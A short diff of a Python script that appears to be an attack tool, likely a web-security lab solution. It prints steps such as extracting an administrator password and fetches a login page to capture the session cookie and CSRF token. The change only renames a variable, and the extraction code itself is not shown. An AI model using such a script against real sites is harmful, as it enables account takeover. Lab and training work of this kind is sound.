@@ -63,7 +63,7 @@ print(Fore.WHITE + "5. Extracting the administrator password.. " + Fore.GREEN + 
 
 try:
     # fetch the login page
-    get_login = requests.get(f"https://{domain}/login")
+    login_page = requests.get(f"https://{domain}/login")
 
 except:
     print(Fore.RED + "[!] Failed to GET /login page")
@@ -73,10 +73,10 @@ except:
 print(Fore.WHITE + "6. Fetching login page to get a valid session and csrf token.. " + Fore.GREEN + "OK")
 
 # get session cookie
-session = get_login.cookies.get("session")
+session = login_page.cookies.get("session")
 
 # Extract the csrf token
-csrf = re.findall("csrf.+value=\"(.+)\"", get_login.text)[0]
+csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
 
 # data to send via POST
 data = {
